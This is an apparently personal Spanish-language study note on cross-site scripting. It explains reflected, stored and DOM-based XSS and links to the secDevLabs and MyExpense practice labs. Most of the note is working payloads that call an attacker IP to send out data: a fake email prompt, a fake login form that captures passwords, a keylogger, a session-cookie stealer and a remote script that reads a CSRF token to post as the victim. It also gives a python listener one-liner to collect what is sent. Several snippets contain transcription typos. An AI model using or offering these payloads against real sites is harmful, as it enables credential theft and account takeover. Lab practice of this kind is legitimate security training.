----------
Tags: #xss

--------------
Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
--------------
## XSS básico

Podemos inyectar código JS para poder hacer distintos tipos de ataques:
```html
<script>alert("XSS")</script>
```

## Pedir correo a la víctima con alert

Podemos escuchar con un servidor en la máquina atacante para ver el email que ha puesto el usuario.
```html
<script>
	var email = prompt( "Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
	if (email == null || email == ""){
		alert "Es necesario introducir un correo válido para visualizar el post");
	} else {
		fetch("http://192.168.111.45/?email=" + email);
	}
</script>
```

## Pedir correo y contraseña sin alert

```html
<div id="formContainer"></div>
<script> var email;
	var password;
	var form = '<form>' + 
		'Email: <input type="email" id="email" required>' + 'Contraseña: <input type="password" id="password" required>' + '<input type="button" onclick="submitForm0" value="Submit">' 
	+ '</form>';
	
	document.getElementByld("formContainer").innerHTML=form;
	
	function submitForm0 {
		email = document.qetElementByld("email"). value;
		password = document.getElementByld("password").value;
		fetch("http://192.168.111.45/?email=" + email + "&password=" + password);
	}
</script>
```
Podemos estar en escucha por el puerto 80 para capturar el email y password.
## Keylogger

```html
<script>
	var k = ""
	document.onkeypress = function(e){
		e = e || window. event;
		k += e.key;
		var i = new Image() ;
		i.src = "http://192.168.111.45/" + k;
	};
</script>
```
Escuchando en la direccion ip 192.168.111.45 en el puerto 80. Con el siguiente comando:
```bash
python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^. *\s]+'
```

## Redirigir a un usuario

```html
<script>
	window.location.href = "https://hack4u.io";
</script>
```

## Capturar cookies de sesión

Si *httponly* está habilitado, deberemos desactivarlo para poder capturar la cookie.
```html
<script>
	var request = new XMLHttpRequest();
	request.open('GET','http://192.168.111.45/?cookie=' + document.cookie);
	request.send();
</script>
```
Escuchando en el puerto ip en el puerto 80.

## Utilizar csrf_tocken con POST

Si conseguimos escribir esto en una publicación, esta se actualizará  con el cambio de powned.js
```html
<script src=""http://192.168.111.45/powned.js"></script>
```

Powned.js:
```js
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true; //En caso de que sea un csrf_token dinamico
req1.send();

var response = req1. responseText;
var parser = new DOMParser();
var doc = parser .parseFromString( response, 'text/html');
var token = doc. getElementsByName("_csrf_token")[0]. value;

var req2 = new XMLHttpRequest);
var data = "title=Mi%20jefe%20es%20un%20cabrón&subtitle=JEFE%20CABRONAZO&text=Odio %20a%20mi%20equipo&_csrf_token=" + token;

req2.open('POST', 'http://localhost:10007/newgossip', false);
red2.withcredentials = true;
req2. setRequestHeader('Content-Type','application/x-www-form-urlencoded');
req2. send(data);
```

------------------
# Practicar
- [MyExpense: 1](https://www.vulnhub.com/entry/myexpense-1,405/)

